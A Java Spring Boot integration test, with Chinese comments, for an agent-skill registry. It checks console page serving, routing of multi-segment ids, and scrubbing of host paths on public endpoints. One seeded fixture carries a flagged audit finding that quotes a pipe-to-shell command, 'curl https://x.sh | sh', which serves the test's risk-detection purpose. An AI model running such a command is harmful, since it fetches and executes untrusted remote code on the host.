package com.zifang.z.skill.adminharness;

import com.zifang.z.skill.api.dto.SkillDto;
import com.zifang.z.skill.api.spec.SkillFormat;
import com.zifang.z.skill.core.registry.SkillRegistry;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.test.web.client.TestRestTemplate;
import org.springframework.boot.web.server.LocalServerPort;
import org.springframework.context.annotation.Configuration;
import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
import org.springframework.http.ResponseEntity;

import java.util.List;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * 真 servlet 宿主 + 真 HTTP 打一遍兼容面与控制面入口 —— MockMvc 证不到的两件事在这里补上:
 *
 * <ul>
 *   <li>控制台页是不是真被 Boot 的静态资源映射暴露出来(README 里那个 URL 是用户唯一会点的入口,
 *       而页面上一次差点死在 {@code templates/} 里);</li>
 *   <li>带斜杠的多段 id 能不能穿过真 Tomcat 的 URI 解析走到 {@code /**} 端点(MockMvc 自己造请求,
 *       绕过了容器这一层).</li>
 * </ul>
 *
 * <p>宿主形态刻意只靠两个模块各自的自动装配, 不 {@code @ComponentScan} 任何产品包 —— 否则
 * {@code AdminController} 会被扫进来, 双钥匙门就白测了(门本身另见 {@code AdminControllerExposureTest}).
 */
@SpringBootTest(classes = SkillHostOverHttpTest.Host.class,
        webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT,
        properties = {"z.skill.enabled=true", "z.skill.expose-admin=true"})
public class SkillHostOverHttpTest {

    @EnableAutoConfiguration
    @Configuration(proxyBeanMethods = false)
    public static class Host {
    }

    @Autowired
    private SkillRegistry registry;
    @Autowired
    private TestRestTemplate http;
    @LocalServerPort
    private int port;

    @BeforeEach
    void seedCatalog() {
        registry.register(SkillDto.builder()
                .id("pdf").slug("pdf").name("pdf").description("处理 PDF")
                .source("anthropics/skills").sourceType("api").format(SkillFormat.AGENT_SKILLS)
                .category("documents").installCount(200963).riskLevel(SkillDto.RISK_SAFE)
                .contentHash("aaa").skillFilePath("pdf/SKILL.md").build());
        registry.register(SkillDto.builder()
                .id("bad-shell/pipeline").slug("pipeline").name("pipeline").description("Run a pipeline")
                .source("bad-shell").sourceType("local").format(SkillFormat.FLAT_MARKDOWN)
                .category("automation").riskLevel(SkillDto.RISK_CRITICAL)
                .issues(java.util.Arrays.asList("critical:pipe-to-shell -> curl https://x.sh | sh"))
                .contentHash("bbb").skillFilePath("pipeline.md").build());
        // 本机平台自动发现种出来的样子: origin 是这台机器上的真 file: 地址
        registry.register(SkillDto.builder()
                .id("local-demo/demo").slug("demo").name("demo").description("A skill found on this host")
                .source("local-demo").sourceType("local").format(SkillFormat.AGENT_SKILLS)
                .category("documents").riskLevel(SkillDto.RISK_LOW)
                .origin(hostSkillFile()).skillFilePath("demo/SKILL.md").contentHash("ccc").build());
    }

    /** 本机目录地址, 从 user.dir 推出来而不是硬编码 /Users/<谁> —— 换台机器这条断言照样有真猎物. */
    private static String hostSkillFile() {
        return new java.io.File(System.getProperty("user.dir"), "skills/local-demo/SKILL.md")
                .getAbsoluteFile().toURI().toString();
    }

    private static String hostRoot() {
        return new java.io.File(System.getProperty("user.dir")).getAbsolutePath();
    }

    /**
     * 同一个 file: 地址, 公共面必须抹掉、控制面必须留着 —— 只钉一头会同时放过两种错.
     *
     * <p>{@code z.skill.enabled=true} 一个开关就把 {@code /skill/*} 全开在没鉴权的端口上, 里头的
     * {@code file:///Users/<name>/<项目>/...} 等于把宿主用户名和目录布局挂到公网上({@code /skill/admin/*}
     * 那道门默认关着, 但公共面没有门). 反过来 {@code /skill/admin/*} 是运维排查用的, 抹错了地方就等于
     * 让人看不见这条 skill 到底装在哪个目录里.
     */
    @Test
    void hostPathsLeaveThePublicPlaneButStayOnTheAdminPlane() throws Exception {
        String root = hostRoot();
        // 带着种的这条本机条目走一遍: 这些出口不仅要"干净", 还得确实把这条条目发出来了,
        // 否则"没有 file:"可能只是因为压根没东西
        String[] carriesEntry = {"/skill/list", "/skill/search?q=demo", "/skill/detail?id=local-demo/demo",
                "/skill/compat/skills-sh/api/v1/skills/local-demo/demo"};
        for (String path : carriesEntry) {
            String body = bodyOf(path);
            assertTrue(body.contains("local-demo"), path + " 里连种的这条本机条目都没有, 测了个寂寞: " + body);
            assertNoHostPath(path, body, root);
        }
        // 剩下这些公共出口靠本机平台自动发现拿到的真目录当猎物(这台机器上没有就是空跑, 所以下面还钉了控制面)
        for (String path : new String[]{"/skill/sources", "/skill/stats", "/skill/installed", "/skill/updates",
                "/skill/categories", "/skill/compat/skills-sh/api/search?q=demo"}) {
            assertNoHostPath(path, bodyOf(path), root);
        }

        // 写出口也过一次真实进程边界: 安装回执曾经把 file:///Users/... 原样回显, 而它既不在上面
        // 这份 GET 清单里, 也不在控制台页 fetch 的路径里 —— 只钉读出口会整个放过它.
        org.springframework.http.HttpHeaders json = new org.springframework.http.HttpHeaders();
        json.setContentType(org.springframework.http.MediaType.APPLICATION_JSON);
        ResponseEntity<String> receipt = http.postForEntity(url("/skill/install"),
                new org.springframework.http.HttpEntity<String>("{\"id\":\"local-demo/demo\"}", json), String.class);
        assertEquals(200, receipt.getStatusCodeValue(), "安装出口在真宿主上打不通, 下面都是空话");
        String got = String.valueOf(receipt.getBody());
        assertTrue(got.contains("local-demo/demo"), "回执里连装的是哪条都没说, 测了个寂寞: " + got);
        assertNoHostPath("/skill/install", got, root);
        // 抹过一道不能等于把回执废掉: 客户端要靠 contentHash 校验装到的东西没变
        assertTrue(got.contains("\"contentHash\":\"ccc\""), "回执的 contentHash 被抹掉了: " + got);
        // 写完要读得回来, 否则下面那句"卸载成功"可能只是在答一个根本没发生过的安装.
        // 这条也是控制台页那条按钮的真实形状: 聚合来的 id 就是带斜杠的 source/slug.
        String slashId = "local-demo/demo";
        String encodedId = java.net.URLEncoder.encode(slashId, "UTF-8");
        assertTrue(bodyOf("/skill/installed").contains(slashId),
                "装完在 /skill/installed 上读不回来, 后面的卸载断言是空的");
        // 同一个斜杠 id 去要正文: 这条也只有查询串形走得通. 更要紧的是钉住 MVC 没把 /skill/content
        // 交给那条 {id} 映射 —— 那会表现为一句 "skill not found: content"(实测过这个形状).
        String preview = bodyOf(new java.net.URI(url("/skill/content?id=" + encodedId)));
        assertTrue(preview.contains("\"id\":\"" + slashId + "\""),
                "/skill/content 没按查询串里的斜杠 id 答题, 疑似被 /skill/{id} 那条吃掉了: " + preview);
        // 用 URI 而不是 String: 传 String 会被再编码一次, %2F 变 %252F, 量的就不是页面那个请求了
        java.net.URI uninstall = new java.net.URI(url("/skill/uninstall?id=" + encodedId));
        assertEquals(200, http.exchange(uninstall, org.springframework.http.HttpMethod.DELETE,
                        null, String.class).getStatusCodeValue(),
                "带斜杠的 id 在真宿主上卸不掉 —— 页面拼接的就是这个形状, 换回路径变量形会被 Tomcat 拒 400");
        assertFalse(bodyOf("/skill/installed").contains(slashId),
                "卸载之后记录还在, 上面那句 200 是假的");

        ResponseEntity<String> admin = http.getForEntity(url("/skill/admin/skills"), String.class);
        assertEquals(200, admin.getStatusCodeValue(), "门开着却拿不到控制面, 这条极性断言没有意义");
        assertTrue(String.valueOf(admin.getBody()).contains(root),
                "控制面把本机目录一起抹了 —— 排查时看不见这条 skill 装在哪个目录: " + admin.getBody());

        // 来源视图的 origin 是裸绝对路径(/Users/... 而非 file:...), 上面两道检查都拦不到它 ⇒ 单独钉。
        // 这一层的猎物取决于跑测试的机器上有没有本机平台(没有就是空跑), 所以配上"公共面不许整条删失":
        // 条数与控制面必须一致, 真正把这条钉死的是 SkillControllerTest 里那条有夹具的断言。
        @SuppressWarnings("unchecked")
        ResponseEntity<List> publicSources = http.getForEntity(url("/skill/sources"), List.class);
        @SuppressWarnings("unchecked")
        ResponseEntity<List> adminSources = http.getForEntity(url("/skill/admin/sources"), List.class);
        assertEquals(200, publicSources.getStatusCodeValue());
        assertEquals(200, adminSources.getStatusCodeValue());
        assertEquals(adminSources.getBody().size(), publicSources.getBody().size(),
                "抹来源地址不能把来源整条抹没");
        for (Object row : publicSources.getBody()) {
            Map<String, Object> r = (Map<String, Object>) row;
            assertNull(r.get("origin"), "来源还带着本机目录: " + r);
            assertNotNull(r.get("id"), "来源身份要照给, 客户端按它筛选");
        }
    }

    private String bodyOf(String path) {
        return answer(http.getForEntity(url(path), String.class), path);
    }

    /**
     * 已经自己编码过的 URL 必须走这条, 不要走上面那个 String 版本.
     *
     * <p>把带 {@code %2F} 的串交给 TestRestTemplate 的模板编码, 它会把 {@code %} 再编一次:
     * 我发 {@code ?id=local-demo%2Fdemo}, 服务端解出来还是 {@code local-demo%2Fdemo},
     * {@code require()} 于是报 404 —— 看着像"这条出口对斜杠 id 是死的", 实际是我的量具把 id 弄坏了.
     */
    private String bodyOf(java.net.URI uri) {
        return answer(http.exchange(uri, org.springframework.http.HttpMethod.GET, null, String.class),
                String.valueOf(uri));
    }

    private static String answer(ResponseEntity<String> r, String what) {
        // 状态码和响应体都要进消息: "打不通"背后可能是路由吃掉了、可能是 500、也可能是鉴权门,
        // 只报路径会让人去猜(实测为猜这个 404 专门加了一轮)
        assertEquals(200, r.getStatusCodeValue(),
                "公共出口打不通, 下面的断言都是空话: " + what + " -> " + r.getStatusCodeValue()
                        + " " + r.getBody());
        return String.valueOf(r.getBody());
    }

    private static void assertNoHostPath(String path, String body, String root) {
        assertFalse(body.contains("file:"), path + " 把 file: 地址发到了公共面: " + body);
        assertFalse(body.contains(root), path + " 把本机绝对路径发到了公共面: " + body);
    }

    private String url(String path) {
        return "http://127.0.0.1:" + port + path;
    }

    /** 控制台页真能被浏览器打开, 且打开的是 static/ 里那份新页(它会去打 /skill/admin/*). */
    @Test
    void consolePageIsServedByTheRealContainer() {
        ResponseEntity<String> page = http.getForEntity(url("/skill-admin/index.html"), String.class);

        assertEquals(200, page.getStatusCodeValue(), "README 承诺的 /skill-admin/index.html 在真宿主上是死链");
        assertTrue(String.valueOf(page.getHeaders().getContentType()).startsWith("text/html"),
                "控制台页不是以 html 返回: " + page.getHeaders().getContentType());
        assertTrue(page.getBody() != null && page.getBody().contains("/skill/admin/overview"),
                "打开的不是当前这份控制台页: " + page.getBody());
    }

    /** 兼容端点在真 HTTP 上可用: 多段 id、审计、注册表索引、搜索. */
    @Test
    @SuppressWarnings("unchecked")
    void compatEndpointsAnswerRealHttpRequests() {
        ResponseEntity<Map> detail = http.getForEntity(
                url("/skill/compat/skills-sh/api/v1/skills/anthropics/skills/pdf"), Map.class);
        assertEquals(200, detail.getStatusCodeValue(), "带斜杠的 skills.sh id 在真 Tomcat 上路由不到");
        assertEquals("anthropics/skills/pdf", detail.getBody().get("id"));

        ResponseEntity<Map> audit = http.getForEntity(
                url("/skill/compat/skills-sh/api/v1/skills/audit/bad-shell/pipeline"), Map.class);
        assertEquals(200, audit.getStatusCodeValue(), "审计端点的多段 id 同样要能路由");
        List<Map<String, Object>> audits = (List<Map<String, Object>>) audit.getBody().get("audits");
        assertEquals("fail", audits.get(0).get("status"));
        assertEquals("CRITICAL", audits.get(0).get("riskLevel"));

        ResponseEntity<Map> index = http.getForEntity(url("/.well-known/agent-skills/index.json"), Map.class);
        assertEquals(200, index.getStatusCodeValue());
        assertTrue(((Number) index.getBody().get("total")).intValue() >= 2,
                "注册表索引没把目录里的条目都列出来: " + index.getBody().get("total"));

        ResponseEntity<Map> search = http.getForEntity(
                url("/skill/compat/skills-sh/api/search?q=pdf&limit=5"), Map.class);
        assertEquals(200, search.getStatusCodeValue());
        // 这个宿主开着"本机平台自动发现", 目录里有什么取决于跑测试的机器 ⇒ 只钉形状与"我种的那条在不在",
        // 不钉绝对条数(钉了就成了只有在这台机器上才绿的断言)
        List<Map<String, Object>> hits = (List<Map<String, Object>>) search.getBody().get("skills");
        assertNotNull(hits, String.valueOf(search.getBody()));
        assertTrue(idsOf(hits).contains("anthropics/skills/pdf"), "搜索没命中种下去的那条: " + idsOf(hits));
        for (Map<String, Object> node : hits) {
            assertEquals(new java.util.LinkedHashSet<String>(java.util.Arrays.asList(
                            "id", "skillId", "name", "source", "installs")), node.keySet(),
                    "skills.sh 的搜索条目键集合变了: " + node);
        }
    }

    private static List<String> idsOf(List<Map<String, Object>> nodes) {
        List<String> out = new java.util.ArrayList<String>();
        for (Map<String, Object> node : nodes) out.add(String.valueOf(node.get("id")));
        return out;
    }

    /** 自家 index.json 给客户端的主文件位必须可用: files[0] 就是他们当正文取的那个位置. */
    @Test
    @SuppressWarnings("unchecked")
    void ownIndexGivesClientsAUsableMainFileSlot() {
        ResponseEntity<Map> index = http.getForEntity(url("/.well-known/agent-skills/index.json"), Map.class);
        List<Map<String, Object>> skills = (List<Map<String, Object>>) index.getBody().get("skills");
        assertNotNull(skills);
        for (Map<String, Object> node : skills) {
            List<String> files = (List<String>) node.get("files");
            assertTrue(files != null && !files.isEmpty(), node.get("name") + " 没给出主文件位");
            assertTrue(String.valueOf(files.get(0)).endsWith("SKILL.md"),
                    "files[0] 必须是客户端当正文位置的那个文件: " + files);
        }
    }
}
